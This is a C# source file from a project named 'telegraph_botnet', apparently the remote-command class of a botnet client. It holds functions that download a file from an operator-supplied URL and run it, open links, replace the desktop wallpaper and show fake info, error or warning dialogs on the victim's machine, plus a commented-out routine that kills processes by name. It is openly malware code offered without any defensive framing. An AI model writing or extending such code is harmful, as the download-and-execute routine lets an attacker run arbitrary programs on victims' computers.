using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Policy;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace telegraph_botnet
{
    internal class functions
    {
        public static void OpenLink(string URL) 
        {
            if (URL.StartsWith("http"))
            {
                Thread thr = new Thread(() => { Process.Start(URL); });
                thr.Start();
            }
        }

        public static void DownloadExecute(string URL) 
        {
            Thread thr = new Thread(() =>
            {
                string file_path = web.DownloadFile(URL);
                try { Process.Start(file_path); }
                catch { }
            });
            thr.Start();
        }
        
        public static void Background(string URL) 
        {
            Thread thr = new Thread(() =>
            {
                string file_path = web.DownloadFile(URL);
                ChangeDesktop.ChangeDesktopBG(file_path);
            });
            thr.Start();
        }

        public static void DialogInfo(string TEXT)
        {
            Thread thr = new Thread(() =>
            {
                Dialog.DialogShowInfo(TEXT);
            });
            thr.Start();
        }

        public static void DialogError(string TEXT)
        {
            Thread thr = new Thread(() =>
            {
                Dialog.DialogShowError(TEXT);
            });
            thr.Start();
        }

        public static void DialogWarning(string TEXT)
        {
            Thread thr = new Thread(() =>
            {
                Dialog.DialogShowWarning(TEXT);
            });
            thr.Start();
        }
        /*
        public static void kill(string PROCES)
        {
            Thread thr = new Thread(() =>
            {
                Process[] localByName = Process.GetProcessesByName(PROCES);
                foreach (Process p in localByName)
                {
                    p.Kill();
                }
            });
            thr.Start();
        }
        */
    }
}
